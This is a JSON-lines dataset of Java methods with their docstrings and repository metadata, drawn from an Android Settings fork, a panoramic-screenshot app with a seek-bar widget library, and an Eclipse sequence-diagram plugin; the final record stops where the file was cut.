{"docstring": "/**\n * Updates provider icons. Subclasses should call this in onCreate()\n * and update any UI that depends on AuthenticatorDescriptions in onAuthDescriptionsUpdated().\n */\n", "func_signal": "public void updateAuthDescriptions(Context context)", "code": "{\n    mAuthDescs = AccountManager.get(context).getAuthenticatorTypes();\n    for (int i = 0; i < mAuthDescs.length; i++) {\n        mTypeToAuthDescription.put(mAuthDescs[i].type, mAuthDescs[i]);\n    }\n}", "path": "src\\com\\android\\settings\\accounts\\AuthenticatorHelper.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * see confirmPatternThenDisableAndClear\n */\n", "func_signal": "@Override\npublic void onActivityResult(int requestCode, int resultCode, Intent data)", "code": "{\n    super.onActivityResult(requestCode, resultCode, data);\n    if (requestCode == CONFIRM_EXISTING_FOR_BIOMETRIC_WEAK_IMPROVE_REQUEST &&\n            resultCode == Activity.RESULT_OK) {\n        startBiometricWeakImprove();\n        return;\n    } else if (requestCode == CONFIRM_EXISTING_FOR_BIOMETRIC_WEAK_LIVELINESS_OFF &&\n            resultCode == Activity.RESULT_OK) {\n        final LockPatternUtils lockPatternUtils = mChooseLockSettingsHelper.utils();\n        lockPatternUtils.setBiometricWeakLivelinessEnabled(false);\n        // Setting the mBiometricWeakLiveliness checked value to false is handled when onResume\n        // is called by grabbing the value from lockPatternUtils.  We can't set it here\n        // because mBiometricWeakLiveliness could be null\n        return;\n    }\n    createPreferenceHierarchy();\n}", "path": "src\\com\\android\\settings\\SecuritySettings.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * Ping a IP address.\n */\n", "func_signal": "private final void pingIpAddr()", "code": "{\n    try {\n        // This is hardcoded IP addr. This is for testing purposes.\n        // We would need to get rid of this before release.\n        String ipAddress = \"74.125.47.104\";\n        Process p = Runtime.getRuntime().exec(\"ping -c 1 \" + ipAddress);\n        int status = p.waitFor();\n        if (status == 0) {\n            mPingIpAddrResult = \"Pass\";\n        } else {\n            mPingIpAddrResult = \"Fail: IP addr not reachable\";\n        }\n    } catch (IOException e) {\n        mPingIpAddrResult = \"Fail: IOException\";\n    } catch (InterruptedException e) {\n        mPingIpAddrResult = \"Fail: InterruptedException\";\n    }\n}", "path": "src\\com\\android\\settings\\RadioInfo.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * Finds a matching activity for a preference's intent. If a matching\n * activity is not found, it will remove the preference.\n *\n * @param context The context.\n * @param parentPreferenceGroup The preference group that contains the\n *            preference whose intent is being resolved.\n * @param preferenceKey The key of the preference whose intent is being\n *            resolved.\n * @param flags 0 or one or more of\n *            {@link #UPDATE_PREFERENCE_FLAG_SET_TITLE_TO_MATCHING_ACTIVITY}\n *            .\n * @return Whether an activity was found. If false, the preference was\n *         removed.\n */\n", "func_signal": "public static boolean updatePreferenceToSpecificActivityOrRemove(Context context,\n        PreferenceGroup parentPreferenceGroup, String preferenceKey, int flags)", "code": "{\n\n    Preference preference = parentPreferenceGroup.findPreference(preferenceKey);\n    if (preference == null) {\n        return false;\n    }\n\n    Intent intent = preference.getIntent();\n    if (intent != null) {\n        // Find the activity that is in the system image\n        PackageManager pm = context.getPackageManager();\n        List<ResolveInfo> list = pm.queryIntentActivities(intent, 0);\n        int listSize = list.size();\n        for (int i = 0; i < listSize; i++) {\n            ResolveInfo resolveInfo = list.get(i);\n            if ((resolveInfo.activityInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM)\n                    != 0) {\n\n                // Replace the intent with this specific activity\n                preference.setIntent(new Intent().setClassName(\n                        resolveInfo.activityInfo.packageName,\n                        resolveInfo.activityInfo.name));\n\n                if ((flags & UPDATE_PREFERENCE_FLAG_SET_TITLE_TO_MATCHING_ACTIVITY) != 0) {\n                    // Set the preference title to the activity's label\n                    preference.setTitle(resolveInfo.loadLabel(pm));\n                }\n\n                return true;\n            }\n        }\n    }\n\n    // Did not find a matching activity, so remove the preference\n    parentPreferenceGroup.removePreference(preference);\n\n    return false;\n}", "path": "src\\com\\android\\settings\\Utils.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * Locks the activity orientation to the current device orientation\n * @param act\n */\n", "func_signal": "public static void lockCurrentOrientation(Activity act)", "code": "{\n    int currentRotation = act.getWindowManager().getDefaultDisplay().getRotation();\n    int frozenRotation = 0;\n    int orientation = act.getResources().getConfiguration().orientation;\n    switch(currentRotation) {\n        case Surface.ROTATION_0:\n            frozenRotation = orientation == Configuration.ORIENTATION_LANDSCAPE\n                ? ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE : ActivityInfo.SCREEN_ORIENTATION_PORTRAIT;\n            break;\n        case Surface.ROTATION_90:\n            frozenRotation = orientation == Configuration.ORIENTATION_PORTRAIT\n                ? ActivityInfo.SCREEN_ORIENTATION_REVERSE_PORTRAIT : ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE;\n            break;\n        case Surface.ROTATION_180:\n            frozenRotation = orientation == Configuration.ORIENTATION_LANDSCAPE\n                ? ActivityInfo.SCREEN_ORIENTATION_REVERSE_LANDSCAPE : ActivityInfo.SCREEN_ORIENTATION_REVERSE_PORTRAIT;\n            break;\n        case Surface.ROTATION_270:\n            frozenRotation = orientation == Configuration.ORIENTATION_PORTRAIT\n                ? ActivityInfo.SCREEN_ORIENTATION_PORTRAIT : ActivityInfo.SCREEN_ORIENTATION_REVERSE_LANDSCAPE;\n            break;\n    }\n    act.setRequestedOrientation(frozenRotation);\n}", "path": "src\\com\\android\\settings\\Utils.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * Sets the color of the seek thumb, as well as the color of the popup indicator.\n *\n * @param thumbColor     The color the seek thumb will be changed to\n * @param indicatorColor The color the popup indicator will be changed to\n *                       The indicator will animate from thumbColor to indicatorColor\n *                       when opening\n */\n", "func_signal": "public void setThumbColor(int thumbColor, int indicatorColor)", "code": "{\n    mThumb.setColorStateList(ColorStateList.valueOf(thumbColor));\n    mIndicator.setColors(indicatorColor, thumbColor);\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\DiscreteSeekBar.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/**\n * Our DiscreteSeekBar implementation uses a circular drawable on API < 21\n * because we don't set it as Background, but draw it ourselves\n *\n * @param colorStateList\n * @return\n */\n", "func_signal": "public static Drawable getRipple(ColorStateList colorStateList)", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {\n        return SeekBarCompatDontCrash.getRipple(colorStateList);\n    } else {\n        return new AlmostRippleDrawable(colorStateList);\n    }\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\internal\\compat\\SeekBarCompat.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/**\n * Sets the current Indicator formatter string\n *\n * @param formatter\n * @see String#format(String, Object...)\n * @see #setNumericTransformer(DiscreteSeekBar.NumericTransformer)\n */\n", "func_signal": "public void setIndicatorFormatter(@Nullable String formatter)", "code": "{\n    mIndicatorFormatter = formatter;\n    updateProgressMessage(mValue);\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\DiscreteSeekBar.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/*\n * Find the longest common subarray\n * Designed for arrays that have common parts at head and tail\n * @param headArray The array that have a common part with the other at head\n * @param tailArray The array that have a common part with the other at tail\n *\n */\n", "func_signal": "public static <T> int arrayHeadTailMatch(T[] headArray, T[] tailArray, int length, float threshold)", "code": "{\n\tif (headArray.length != tailArray.length) throw new IllegalArgumentException(\"length differs\");\n\t\n\tlong startTime = -1;\n\t\n\tif (DEBUG) {\n\t\tstartTime = System.currentTimeMillis();\n\t}\n\t\n\tint arrayLength = headArray.length;\n\t/*int unmatches = 0;\n\tfloat thresholdValue = (float) length * threshold;\n\t*/\n\tint ret = -1;\n\t\n\tfor (int i = length; i > 0; i--) {\n\t\tint j = arrayLength - i - 1;\n\t\t\n\t\tif (arrayCompareEx(headArray, tailArray, 0, j, i, threshold)) {\n\t\t\tret = i;\n\t\t\tbreak;\n\t\t}\n\t\t\n\t\t/*if (!headArray.get(i).equals(tailArray.get(j))) {\n\t\t\tunmatches++;\n\t\t\t\n\t\t\tif (unmatches > thresholdValue) {\n\t\t\t\tret = i - 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}*/\n\t}\n\t\n\tif (DEBUG) {\n\t\tLog.d(TAG, \"arrayHeadTailMatch time: \" + (System.currentTimeMillis() - startTime));\n\t}\n\t\n\treturn ret;\n}", "path": "app\\src\\main\\java\\info\\papdt\\pano\\support\\Utility.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/**\n * The two colors that will be used for the seek thumb.\n *\n * @param startColor Color used for the seek thumb\n * @param endColor   Color used for popup indicator\n */\n", "func_signal": "public void setColors(int startColor, int endColor)", "code": "{\n    mStartColor = startColor;\n    mEndColor = endColor;\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\internal\\drawable\\MarkerDrawable.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/**\n * Sets the current {@link DiscreteSeekBar.NumericTransformer}\n *\n * @param transformer\n * @see #getNumericTransformer()\n */\n", "func_signal": "public void setNumericTransformer(@Nullable NumericTransformer transformer)", "code": "{\n    mNumericTransformer = transformer != null ? transformer : new DefaultNumericTransformer();\n    //We need to refresh the PopupIndicator view\n    if (!isInEditMode()) {\n        if (mNumericTransformer.useStringTransform()) {\n            mIndicator.updateSizes(mNumericTransformer.transformToString(mMax));\n        } else {\n            mIndicator.updateSizes(convertValueToMessage(mNumericTransformer.transform(mMax)));\n        }\n    }\n    updateProgressMessage(mValue);\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\DiscreteSeekBar.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/*public static Bitmap bitmapThresholding(Bitmap originalBmp, int threshold) {\n\tBitmap bmp = toGrayscale(originalBmp);\n\tBitmap out = Bitmap.createBitmap(bmp.getWidth(), bmp.getHeight(), Bitmap.Config.RGB_565);\n\t\n\tfor (int x = 0; x < bmp.getWidth(); x++) {\n\t\tfor (int y = 0; y < bmp.getWidth(); y++) {\n\t\t\tint color = Color.red(bmp.getPixel(x, y));\n\t\t\t\n\t\t\tif (color < threshold) {\n\t\t\t\tout.setPixel(x, y, Color.rgb(0, 0, 0));\n\t\t\t} else {\n\t\t\t\tout.setPixel(x, y, Color.rgb(255, 255, 255));\n\t\t\t}\n\t\t}\n\t}\n\t\n\treturn out;\n\t\n}\n\npublic static int calculateThresholdValue(Bitmap originalBmp) {\n\tBitmap bmp = toGrayscale(originalBmp);\n\t\n\tint T = 128;\n\tint Ts = 127;\n\t\n\twhile (T != Ts) {\n\t\t\n\t\tT = Ts;\n\t\t\n\t\tint T1 = 0;\n\t\tint T2 = 0;\n\t\t\n\t\tint G1 = 0;\n\t\tint G2 = 0;\n\t\tint G1_count = 0;\n\t\tint G2_count = 0;\n\t\n\t\tfor (int x = 0; x < bmp.getWidth(); x++) {\n\t\t\tfor (int y = 0; y < bmp.getWidth(); y++) {\n\t\t\t\tint color = Color.red(bmp.getPixel(x, y));\n\t\t\t\t\n\t\t\t\tif (color < T) {\n\t\t\t\t\tG1 += color;\n\t\t\t\t\tG1_count++;\n\t\t\t\t} else {\n\t\t\t\t\tG2 += color;\n\t\t\t\t\tG2_count++;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t\tT1 = G1 / G1_count;\n\t\tT2 = G2 / G2_count;\n\t\n\t\tTs = (T1 + T2) / 2;\n\t}\n\t\n\treturn T;\n}*/\n", "func_signal": "public static Bitmap toGrayscale(Bitmap bmpOriginal)", "code": "{        \n\tint width, height;\n\theight = bmpOriginal.getHeight();\n\twidth = bmpOriginal.getWidth();    \n\n\tBitmap bmpGrayscale = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);\n\tCanvas c = new Canvas(bmpGrayscale);\n\tPaint paint = new Paint();\n\tColorMatrix cm = new ColorMatrix();\n\tcm.setSaturation(0);\n\tColorMatrixColorFilter f = new ColorMatrixColorFilter(cm);\n\tpaint.setColorFilter(f);\n\tc.drawBitmap(bmpOriginal, 0, 0, paint);\n\treturn bmpGrayscale;\n}", "path": "app\\src\\main\\java\\info\\papdt\\pano\\support\\BitmapUtility.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/**\n * android.support.v4.view.ViewCompat SHOULD include this once and for all!!\n * But it doesn't...\n *\n * @param view\n * @param background\n */\n", "func_signal": "@SuppressWarnings(\"deprecation\")\npublic static void setBackground(View view, Drawable background)", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {\n        SeekBarCompatDontCrash.setBackground(view, background);\n    } else {\n        view.setBackgroundDrawable(background);\n    }\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\internal\\compat\\SeekBarCompat.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/**\n * Sets the custom Outline provider on API>=21.\n * Does nothing on API<21\n *\n * @param view\n * @param markerDrawable\n */\n", "func_signal": "public static void setOutlineProvider(View view, final MarkerDrawable markerDrawable)", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {\n        SeekBarCompatDontCrash.setOutlineProvider(view, markerDrawable);\n    }\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\internal\\compat\\SeekBarCompat.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/**\n * I'm NOT completely sure how all this bitwise things work...\n *\n * @param curFlags\n * @return\n */\n", "func_signal": "private int computeFlags(int curFlags)", "code": "{\n    curFlags &= ~(\n            WindowManager.LayoutParams.FLAG_IGNORE_CHEEK_PRESSES |\n                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |\n                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |\n                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |\n                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |\n                    WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM);\n    curFlags |= WindowManager.LayoutParams.FLAG_IGNORE_CHEEK_PRESSES;\n    curFlags |= WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;\n    curFlags |= WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;\n    curFlags |= WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;\n    return curFlags;\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\internal\\PopupIndicator.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/**\n * Sets the minimum value for this DiscreteSeekBar\n * if the supplied argument is bigger than the Current MAX value,\n * the MAX value will be set to MIN+1\n * <p>\n * Also if the current progress is out of the new range, it will be set to MIN\n * </p>\n *\n * @param min\n * @see #setMax(int)\n * @see #setProgress(int)\n */\n", "func_signal": "public void setMin(int min)", "code": "{\n    mMin = min;\n    if (mMin > mMax) {\n        setMax(mMin + 1);\n    }\n    updateKeyboardRange();\n\n    if (mValue < mMin || mValue > mMax) {\n        setProgress(mMin);\n    }\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\DiscreteSeekBar.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/**\n * Sets the maximum value for this DiscreteSeekBar\n * if the supplied argument is smaller than the Current MIN value,\n * the MIN value will be set to MAX-1\n * <p/>\n * <p>\n * Also if the current progress is out of the new range, it will be set to MIN\n * </p>\n *\n * @param max\n * @see #setMin(int)\n * @see #setProgress(int)\n */\n", "func_signal": "public void setMax(int max)", "code": "{\n    mMax = max;\n    if (mMax < mMin) {\n        setMin(mMax - 1);\n    }\n    updateKeyboardRange();\n\n    if (mValue < mMin || mValue > mMax) {\n        setProgress(mMin);\n    }\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\DiscreteSeekBar.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/**\n * Sets the TextView text direction attribute when possible\n *\n * @param textView\n * @param textDirection\n * @see android.widget.TextView#setTextDirection(int)\n */\n", "func_signal": "public static void setTextDirection(TextView textView, int textDirection)", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {\n        SeekBarCompatDontCrash.setTextDirection(textView, textDirection);\n    }\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\internal\\compat\\SeekBarCompat.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "// Should pass in an empty array that have the length of the result\n", "func_signal": "public MultiThreadTask(A argument, R[] result)", "code": "{\n\tmResult = result;\n\tmArgument = argument;\n}", "path": "app\\src\\main\\java\\info\\papdt\\pano\\processor\\MultiThreadTask.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/**\n * We want the Floater to be full-width because the contents will be moved from side to side.\n * We may/should change this in the future to use just the PARENT View width and/or pass it in the constructor\n */\n", "func_signal": "private void measureFloater()", "code": "{\n    int specWidth = View.MeasureSpec.makeMeasureSpec(screenSize.x, View.MeasureSpec.EXACTLY);\n    int specHeight = View.MeasureSpec.makeMeasureSpec(screenSize.y, View.MeasureSpec.AT_MOST);\n    mPopupView.measure(specWidth, specHeight);\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\internal\\PopupIndicator.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/**\n * As our DiscreteSeekBar implementation uses a circular drawable on API < 21\n * we want to use the same method to set its bounds as the Ripple's hotspot bounds.\n *\n * @param drawable\n * @param left\n * @param top\n * @param right\n * @param bottom\n */\n", "func_signal": "public static void setHotspotBounds(Drawable drawable, int left, int top, int right, int bottom)", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {\n        //We don't want the full size rect, Lollipop ripple would be too big\n        int size = (right - left) / 8;\n        DrawableCompat.setHotspotBounds(drawable, left + size, top + size, right - size, bottom - size);\n    } else {\n        drawable.setBounds(left, top, right, bottom);\n    }\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\internal\\compat\\SeekBarCompat.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/**\n * FORCE the popup window to be removed.\n * You typically calls this when the parent view is being removed from the window to avoid a Window Leak\n */\n", "func_signal": "public void dismissComplete()", "code": "{\n    if (isShowing()) {\n        mShowing = false;\n        try {\n            mWindowManager.removeViewImmediate(mPopupView);\n        } finally {\n        }\n    }\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\internal\\PopupIndicator.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "// px\n", "func_signal": "public static final ScreenshotComposer getInstance()", "code": "{\n\t\tif (sInstance == null) {\n\t\t\tsInstance = new ScreenshotComposer();\n\t\t}\n\t\t\n\t\treturn sInstance;\n\t}", "path": "app\\src\\main\\java\\info\\papdt\\pano\\processor\\ScreenshotComposer.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/**\n * Sets the color of the seek thumb, as well as the color of the popup indicator.\n *\n * @param thumbColorStateList The ColorStateList the seek thumb will be changed to\n * @param indicatorColor      The color the popup indicator will be changed to\n *                            The indicator will animate from thumbColorStateList(pressed state) to indicatorColor\n *                            when opening\n */\n", "func_signal": "public void setThumbColor(@NonNull ColorStateList thumbColorStateList, int indicatorColor)", "code": "{\n    mThumb.setColorStateList(thumbColorStateList);\n    //we use the \"pressed\" color to morph the indicator from it to its own color\n    int thumbColor = thumbColorStateList.getColorForState(new int[]{PRESSED_STATE}, thumbColorStateList.getDefaultColor());\n    mIndicator.setColors(indicatorColor, thumbColor);\n}", "path": "libraries\\discreteSeekBar\\src\\main\\java\\org\\adw\\library\\widgets\\discreteseekbar\\DiscreteSeekBar.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "// True = different\n", "func_signal": "private boolean compareLines(FastBitmapReader bmp1, FastBitmapReader bmp2, int line)", "code": "{\n\tint diff = 0;\n\tfor (int i = 0; i < bmp1.getWidth(); i++) {\n\t\tif (bmp1.getPixel(i, line) != bmp2.getPixel(i, line)) {\n\t\t\tdiff++;\n\t\t}\n\t}\n\t\n\treturn diff > bmp1.getWidth() / 10 * mThreshold;\n}", "path": "app\\src\\main\\java\\info\\papdt\\pano\\processor\\ScreenshotComposer.java", "repo_name": "PaperAirplane-Dev-Team/Panoramic-Screenshot", "stars": 89, "license": "gpl-3.0", "language": "java", "size": 598}
{"docstring": "/* (non-Javadoc)\n * @see org.eclipse.zest.custom.sequence.visuals.WidgetVisualPart#uninstallFigures()\n */\n", "func_signal": "@Override\nprotected void uninstallFigures()", "code": "{\n\tIFigure layer = getFigure().getParent();\n\tif (layer != null) {\n\t\tlayer.remove(getFigure());\n\t}\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\visuals\\ConnectionVisualPart.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/**\n * Lays out the chart. Because a chart may have a lot of children on it, an explicit refresh() or\n * layout() must be called after a child is added or disposed in order to see the results.\n */\n", "func_signal": "@Override\npublic void layout(boolean changed)", "code": "{\n\tif (changed) {\n\t\trefresh();\n\t}\n\tperformLayout();\n\tsuper.layout(changed);\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\widgets\\UMLChart.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/* (non-Javadoc)\n * @see org.eclipse.mylar.zest.custom.sequence.tools.IWidgetTool#handleMouseWheelScrolled(org.eclipse.swt.widgets.Event)\n */\n", "func_signal": "public void handleMouseWheelScrolled(Event event, IFigure mouseTarget)", "code": "{\n\t//find the nearest viewport\n\twhile (!(mouseTarget instanceof Viewport) && mouseTarget != null) {\n\t\tmouseTarget = mouseTarget.getParent();\n\t}\n\tif (mouseTarget instanceof Viewport) {\n\t\tRangeModel rm = ((Viewport)mouseTarget).getVerticalRangeModel();\n\t\trm.setValue(rm.getValue() - event.count*10);\n\t}\n\t\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\widgets\\SelectionTool.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/**\n * @param item\n * @param key\n * @param parentFigure\n */\n", "func_signal": "public ConnectionVisualPart(UMLItem item, String key)", "code": "{\n\tsuper(item, key);\n\tnodeListener = new NodeChangeListener();\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\visuals\\ConnectionVisualPart.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/**\n * Returns a universal font with the given style. Fonts will be disposed automatically. \n */\n", "func_signal": "public Font getFont(int style)", "code": "{\n\tint mask = SWT.BOLD | SWT.ITALIC;\n\tstyle &= mask;\n\tif ((style ^ SWT.NORMAL) == 0) {\n\t\treturn getFont();\n\t}\n\tFont f = fontRegistry.get(style);\n\tif (f == null) {\n\t\tFontData[] data = getFont().getFontData();\n\t\tdata[0].setStyle(style);\n\t\tf = new Font(getDisplay(), data[0]);\n\t\tfontRegistry.put(style, f);\n\t}\n\t\n\treturn f;\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\widgets\\UMLChart.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/**\n * @throws IOException \n * \n */\n", "func_signal": "public void close() throws IOException", "code": "{\n\tif (ra != null) {\n\t\tra.close();\n\t\tra = null;\n\t}\n}", "path": "ca.uvic.chisel.javasketch\\src\\ca\\uvic\\chisel\\javasketch\\persistence\\internal\\logs\\EventReader.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/* (non-Javadoc)\n * @see java.lang.Object#toString()\n */\n", "func_signal": "@Override\npublic String toString()", "code": "{\n\tString name = \"Call on \";\n\ttry {\n\t\tIActivation target = getTarget().getActivation();\n\t\tname = name + target.getMethod().getName();\n\t} catch (NullPointerException e) {}\n\treturn name;\n}", "path": "ca.uvic.chisel.javasketch.data\\src\\ca\\uvic\\chisel\\javasketch\\data\\model\\imple\\internal\\CallImpl.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/**\n * @param part\n */\n", "func_signal": "public void setSource(NodeVisualPart source)", "code": "{\n\tif (source == this.source) return;\n\tNodeVisualPart oldSource = this.source;\n\tthis.source = source;\n\tif (oldSource != null) {\n\t\toldSource.removeSourceConnection(this);\n\t\toldSource.getWidget().removePropertyChangeListener(nodeListener);\n\t}\n\t\n\tif (source != null) {\n\t\tgetConnection().setSourceAnchor(source.getSourceAnchor(this));\n\t\tsource.getWidget().addPropertyChangeListener(nodeListener);\n\t}\n\tsetVisibility(getWidget().isVisible());\n\tgetConnection().invalidate();\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\visuals\\ConnectionVisualPart.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", "size": 342429}
{"docstring": "/* (non-Javadoc)\n * @see org.eclipse.mylar.zest.custom.sequence.tools.IWidgetTool#handleMousePressed(org.eclipse.swt.events.MouseEvent, org.eclipse.swt.widgets.Widget, org.eclipse.draw2d.IFigure)\n */\n", "func_signal": "public void handleMousePressed(MouseEvent me, Widget widget,\n\t\tIFigure cursorTarget)", "code": "{\n\tWidget parent = getCurrentControl();\n\tUMLSequenceChart chart = (UMLSequenceChart) parent;\n\tif (((parent.getStyle() & SWT.MULTI) != 0) && ((me.stateMask & SWT.MOD1) != 0)) {\n\t\tif (widget == null) return;\n\t\tUMLItem[] oldSelection = chart.getSelection();\n\t\tLinkedList<UMLItem> newSelection = new LinkedList<UMLItem>();\n\t\tboolean reselect = false;\n\t\tfor (int i = 0; i < oldSelection.length; i++) {\n\t\t\tUMLItem item = oldSelection[i];\n\t\t\tif (item == widget) {\n\t\t\t\treselect = true;\n\t\t\t\tnewSelection.addFirst(item);\n\t\t\t} else {\n\t\t\t\tnewSelection.addLast(item);\n\t\t\t}\n\t\t}\n\t\tif (!reselect && widget instanceof UMLItem) {\n\t\t\tnewSelection.addLast((UMLItem)widget);\n\t\t}\n\t\tchart.internalUpdateSelection(newSelection.toArray(new UMLItem[newSelection.size()]));\t\t\t\n\t\tif (reselect) {\n\t\t\t//we have found the item a second time. Put it at the\n\t\t\t//top of the selection list, and fire a \"re-select\"\n\t\t\tchart.internalReselect(newSelection.getFirst()); \n\t\t}\t\t\t\n\t} else {\n\t\tif (widget == null) {\n\t\t\tif (chart.getSelection().length != 0) {\n\t\t\t\tchart.internalSetSelection(new UMLItem[0]);\n\t\t\t}\n\t\t} else if (widget != null){\n\t\t\tchart.internalSetSelection(new UMLItem[] {(UMLItem)widget});\n\t\t}\n\t}\n}", "path": "org.eclipse.zest.custom.sequence\\src\\org\\eclipse\\zest\\custom\\sequence\\widgets\\SelectionTool.java", "repo_name": "thechiselgroup/Diver", "stars": 76, "license": "None", "language": "java", 